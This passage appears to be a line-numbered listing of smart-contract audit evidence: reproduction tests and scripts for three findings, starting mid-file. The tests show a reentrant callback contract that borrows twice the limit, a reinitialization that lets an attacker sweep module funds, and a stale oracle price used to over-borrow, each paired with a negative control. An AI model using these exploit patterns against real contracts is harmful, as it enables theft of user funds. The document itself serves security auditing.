run/evidence/C-009/repro.test.mjs:68:  await chain.provider.send("evm_increaseTime", [365 * 24 * 60 * 60]);
run/evidence/C-009/repro.test.mjs:69:  await chain.provider.send("evm_mine", []);
run/evidence/C-009/repro.test.mjs:70:  const now = BigInt((await chain.provider.getBlock("latest")).timestamp);
run/evidence/C-009/repro.test.mjs:71:  return { attacker, attackerAddress, stable, feed, pool, oracle, market, updatedAt, now };
run/evidence/C-009/repro.test.mjs:72:}
run/evidence/C-009/repro.test.mjs:74:test("positive: year-old positive feed answer remains authoritative and enables excess debt", async () => {
run/evidence/C-009/repro.test.mjs:75:  const context = await setup();
run/evidence/C-009/repro.test.mjs:76:  const age = context.now - context.updatedAt;
run/evidence/C-009/repro.test.mjs:77:  const stalePrice = await context.oracle.price();
run/evidence/C-009/repro.test.mjs:78:  const poolPrice = await context.pool.spotPrice();
run/evidence/C-009/repro.test.mjs:79:  const poolBasedLimit = ether(750);
run/evidence/C-009/repro.test.mjs:80:  assert(age > 300n * 24n * 60n * 60n);
run/evidence/C-009/repro.test.mjs:81:  assert.equal(stalePrice, ether(2));
run/evidence/C-009/repro.test.mjs:82:  assert.equal(poolPrice, ether(1));
run/evidence/C-009/repro.test.mjs:84:  await send(context.market.connect(context.attacker).borrow(
run/evidence/C-009/repro.test.mjs:85:    ether(1_500), context.attackerAddress, "0x"
run/evidence/C-009/repro.test.mjs:86:  ));
run/evidence/C-009/repro.test.mjs:87:  assert.equal(await context.market.debt(context.attackerAddress), ether(1_500));
run/evidence/C-009/repro.test.mjs:88:  assert((await context.market.debt(context.attackerAddress)) > poolBasedLimit);
run/evidence/C-009/repro.test.mjs:89:  console.log(JSON.stringify({ oracle: "C-009-positive", feedAgeSeconds: String(age), staleFeedPrice: String(stalePrice), poolPrice: String(poolPrice), poolBasedLimit: String(poolBasedLimit), debtAfter: String(await context.market.debt(context.attackerAddress)) }));
run/evidence/C-009/repro.test.mjs:90:});
run/evidence/C-009/repro.test.mjs:92:test("negative comparator: an explicit freshness bound falls back to pool price and rejects the same debt", async () => {
run/evidence/C-009/repro.test.mjs:93:  const context = await setup("FreshnessOracleC009");
run/evidence/C-009/repro.test.mjs:94:  const boundedPrice = await context.oracle.price();
run/evidence/C-009/repro.test.mjs:95:  assert.equal(boundedPrice, ether(1));
run/evidence/C-009/repro.test.mjs:96:  await expectRevert(context.market.connect(context.attacker).borrow(
run/evidence/C-009/repro.test.mjs:97:    ether(1_500), context.attackerAddress, "0x"
run/evidence/C-009/repro.test.mjs:98:  ));
run/evidence/C-009/repro.test.mjs:99:  assert.equal(await context.market.debt(context.attackerAddress), 0n);
run/evidence/C-009/repro.test.mjs:100:  console.log(JSON.stringify({ oracle: "C-009-negative", boundedPrice: String(boundedPrice), excessBorrowRejected: true, debtAfter: "0" }));
run/evidence/C-009/repro.test.mjs:101:});
run/evidence/C-009/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-009/reproduce.sh:2:set -euo pipefail
run/evidence/C-009/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-009/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-009/repro.test.mjs
run/evidence/C-005/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-005/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-005/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-005/repro.test.mjs:5:let artifacts;
run/evidence/C-005/repro.test.mjs:7:before(async () => {
run/evidence/C-005/repro.test.mjs:8:  artifacts = await compileAll();
run/evidence/C-005/repro.test.mjs:9:});
run/evidence/C-005/repro.test.mjs:11:async function setup() {
run/evidence/C-005/repro.test.mjs:12:  const chain = await makeChain();
run/evidence/C-005/repro.test.mjs:13:  const [admin, intendedOperator, attacker] = chain.signers;
run/evidence/C-005/repro.test.mjs:14:  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-005/repro.test.mjs:15:  const module = await deploy(artifacts, "StrategyModule", admin);
run/evidence/C-005/repro.test.mjs:16:  await send(module.initialize(await admin.getAddress(), await intendedOperator.getAddress()));
run/evidence/C-005/repro.test.mjs:17:  await send(token.mint(await module.getAddress(), ether(10)));
run/evidence/C-005/repro.test.mjs:18:  assert.equal(await module.initialized(), true);
run/evidence/C-005/repro.test.mjs:19:  return { admin, intendedOperator, attacker, token, module };
run/evidence/C-005/repro.test.mjs:20:}
run/evidence/C-005/repro.test.mjs:22:test("positive: arbitrary caller reinitializes roles and sweeps module funds", async () => {
run/evidence/C-005/repro.test.mjs:23:  const { attacker, token, module } = await setup();
run/evidence/C-005/repro.test.mjs:24:  const attackerAddress = await attacker.getAddress();
run/evidence/C-005/repro.test.mjs:25:  const originalVault = await module.vault();
run/evidence/C-005/repro.test.mjs:26:  const originalOperator = await module.operator();
run/evidence/C-005/repro.test.mjs:27:  assert.notEqual(originalVault, attackerAddress);
run/evidence/C-005/repro.test.mjs:28:  assert.notEqual(originalOperator, attackerAddress);
run/evidence/C-005/repro.test.mjs:30:  await send(module.connect(attacker).initialize(attackerAddress, attackerAddress));
run/evidence/C-005/repro.test.mjs:31:  assert.equal(await module.vault(), attackerAddress);
run/evidence/C-005/repro.test.mjs:32:  assert.equal(await module.operator(), attackerAddress);
run/evidence/C-005/repro.test.mjs:33:  await send(module.connect(attacker).sweep(await token.getAddress(), attackerAddress, ether(10)));
run/evidence/C-005/repro.test.mjs:35:  assert.equal(await token.balanceOf(await module.getAddress()), 0n);
run/evidence/C-005/repro.test.mjs:36:  assert.equal(await token.balanceOf(attackerAddress), ether(10));
run/evidence/C-005/repro.test.mjs:37:  console.log(JSON.stringify({ oracle: "C-005-positive", originalVault, originalOperator, newVault: attackerAddress, newOperator: attackerAddress, attackerToken: String(await token.balanceOf(attackerAddress)) }));
run/evidence/C-005/repro.test.mjs:38:});
run/evidence/C-005/repro.test.mjs:40:test("negative: without reinitialization the same untrusted caller cannot sweep", async () => {
run/evidence/C-005/repro.test.mjs:41:  const { attacker, token, module } = await setup();
run/evidence/C-005/repro.test.mjs:42:  const attackerAddress = await attacker.getAddress();
run/evidence/C-005/repro.test.mjs:43:  await expectRevert(module.connect(attacker).sweep(
run/evidence/C-005/repro.test.mjs:44:    await token.getAddress(), attackerAddress, ether(10)
run/evidence/C-005/repro.test.mjs:45:  ));
run/evidence/C-005/repro.test.mjs:46:  assert.equal(await token.balanceOf(await module.getAddress()), ether(10));
run/evidence/C-005/repro.test.mjs:47:  assert.equal(await token.balanceOf(attackerAddress), 0n);
run/evidence/C-005/repro.test.mjs:48:  console.log(JSON.stringify({ oracle: "C-005-negative", directSweepRejected: true, moduleToken: String(await token.balanceOf(await module.getAddress())), attackerToken: "0" }));
run/evidence/C-005/repro.test.mjs:49:});
run/evidence/C-005/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-005/reproduce.sh:2:set -euo pipefail
run/evidence/C-005/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-005/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-005/repro.test.mjs
run/evidence/C-001/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-001/reproduce.sh:2:set -euo pipefail
run/evidence/C-001/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-001/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-001/repro.test.mjs
run/evidence/C-001/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-001/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-001/repro.test.mjs:3:import { compileAll, deploy, ether, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-001/repro.test.mjs:5:const attackerSource = `
run/evidence/C-001/repro.test.mjs:6:// SPDX-License-Identifier: MIT
run/evidence/C-001/repro.test.mjs:7:pragma solidity 0.8.30;
run/evidence/C-001/repro.test.mjs:9:interface IMarketC001 {
run/evidence/C-001/repro.test.mjs:10:    function borrow(uint256 amount, address receiver, bytes calldata data) external;
run/evidence/C-001/repro.test.mjs:11:}
run/evidence/C-001/repro.test.mjs:13:contract BorrowCallbackC001 {
run/evidence/C-001/repro.test.mjs:14:    IMarketC001 public immutable market;
run/evidence/C-001/repro.test.mjs:15:    bool private nested;
run/evidence/C-001/repro.test.mjs:17:    constructor(IMarketC001 market_) { market = market_; }
run/evidence/C-001/repro.test.mjs:19:    function attack(uint256 amount) external {
run/evidence/C-001/repro.test.mjs:20:        market.borrow(amount, address(this), hex"01");
run/evidence/C-001/repro.test.mjs:21:    }
run/evidence/C-001/repro.test.mjs:23:    function borrowOnce(uint256 amount) external {
run/evidence/C-001/repro.test.mjs:24:        market.borrow(amount, address(this), "");
run/evidence/C-001/repro.test.mjs:25:    }
run/evidence/C-001/repro.test.mjs:27:    function onBorrow(address, uint256 amount, bytes calldata) external {
run/evidence/C-001/repro.test.mjs:28:        require(msg.sender == address(market), "MARKET");
run/evidence/C-001/repro.test.mjs:29:        if (!nested) {
run/evidence/C-001/repro.test.mjs:30:            nested = true;
run/evidence/C-001/repro.test.mjs:31:            market.borrow(amount, address(this), "");
run/evidence/C-001/repro.test.mjs:32:        }
run/evidence/C-001/repro.test.mjs:33:    }
run/evidence/C-001/repro.test.mjs:34:}
run/evidence/C-001/repro.test.mjs:35:`;
run/evidence/C-001/repro.test.mjs:37:let artifacts;
run/evidence/C-001/repro.test.mjs:39:before(async () => {
run/evidence/C-001/repro.test.mjs:40:  artifacts = await compileAll({
run/evidence/C-001/repro.test.mjs:41:    additionalSources: { "run/evidence/C-001/BorrowCallbackC001.sol": attackerSource }
run/evidence/C-001/repro.test.mjs:42:  });
run/evidence/C-001/repro.test.mjs:43:});
run/evidence/C-001/repro.test.mjs:45:async function setup() {
run/evidence/C-001/repro.test.mjs:46:  const chain = await makeChain();
run/evidence/C-001/repro.test.mjs:47:  const [admin, attacker] = chain.signers;
run/evidence/C-001/repro.test.mjs:48:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-001/repro.test.mjs:49:  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-001/repro.test.mjs:50:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-001/repro.test.mjs:51:  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-001/repro.test.mjs:52:  const feed = await deploy(artifacts, "MockFeed", admin, [8, 100_000_000]);
run/evidence/C-001/repro.test.mjs:53:  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-001/repro.test.mjs:54:  const market = await deploy(artifacts, "LendingMarket", admin, [
run/evidence/C-001/repro.test.mjs:55:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
run/evidence/C-001/repro.test.mjs:56:  ]);
run/evidence/C-001/repro.test.mjs:57:  const callback = await deploy(artifacts, "BorrowCallbackC001", attacker, [await market.getAddress()]);
run/evidence/C-001/repro.test.mjs:58:  const callbackAddress = await callback.getAddress();
run/evidence/C-001/repro.test.mjs:60:  await send(stable.mint(await market.getAddress(), ether(10_000)));
run/evidence/C-001/repro.test.mjs:61:  await send(asset.mint(await attacker.getAddress(), ether(1_000)));
run/evidence/C-001/repro.test.mjs:62:  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
run/evidence/C-001/repro.test.mjs:63:  await send(vault.connect(attacker).deposit(ether(1_000), await attacker.getAddress()));
run/evidence/C-001/repro.test.mjs:64:  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
run/evidence/C-001/repro.test.mjs:65:  await send(market.connect(attacker).depositCollateral(ether(1_000), callbackAddress));
run/evidence/C-001/repro.test.mjs:67:  assert.equal(await market.borrowLimit(callbackAddress), ether(750));
run/evidence/C-001/repro.test.mjs:68:  return { attacker, callback, callbackAddress, market, stable };
run/evidence/C-001/repro.test.mjs:69:}
run/evidence/C-001/repro.test.mjs:71:test("positive: nested borrow observes stale debt and extracts twice the limit", async () => {
run/evidence/C-001/repro.test.mjs:72:  const { callback, callbackAddress, market, stable } = await setup();
run/evidence/C-001/repro.test.mjs:73:  const limitBefore = await market.borrowLimit(callbackAddress);
run/evidence/C-001/repro.test.mjs:74:  await send(callback.attack(limitBefore));
run/evidence/C-001/repro.test.mjs:75:  const debtAfter = await market.debt(callbackAddress);
run/evidence/C-001/repro.test.mjs:76:  const stableAfter = await stable.balanceOf(callbackAddress);
run/evidence/C-001/repro.test.mjs:78:  assert.equal(limitBefore, ether(750));
run/evidence/C-001/repro.test.mjs:79:  assert.equal(debtAfter, ether(1_500));
run/evidence/C-001/repro.test.mjs:80:  assert.equal(stableAfter, ether(1_500));
run/evidence/C-001/repro.test.mjs:81:  assert(debtAfter > limitBefore);
run/evidence/C-001/repro.test.mjs:82:  console.log(JSON.stringify({ oracle: "C-001-positive", limitBefore: String(limitBefore), debtAfter: String(debtAfter), attackerStable: String(stableAfter) }));
run/evidence/C-001/repro.test.mjs:83:});
run/evidence/C-001/repro.test.mjs:85:test("negative: removing callback data finalizes one debt increment within the limit", async () => {
run/evidence/C-001/repro.test.mjs:86:  const { callback, callbackAddress, market, stable } = await setup();
run/evidence/C-001/repro.test.mjs:87:  const limitBefore = await market.borrowLimit(callbackAddress);
run/evidence/C-001/repro.test.mjs:88:  await send(callback.borrowOnce(limitBefore));
run/evidence/C-001/repro.test.mjs:89:  const debtAfter = await market.debt(callbackAddress);
run/evidence/C-001/repro.test.mjs:90:  const stableAfter = await stable.balanceOf(callbackAddress);
run/evidence/C-001/repro.test.mjs:92:  assert.equal(debtAfter, limitBefore);
run/evidence/C-001/repro.test.mjs:93:  assert.equal(stableAfter, limitBefore);
run/evidence/C-001/repro.test.mjs:94:  console.log(JSON.stringify({ oracle: "C-001-negative", limitBefore: String(limitBefore), debtAfter: String(debtAfter), attackerStable: String(stableAfter) }));
run/evidence/C-001/repro.test.mjs:95:});
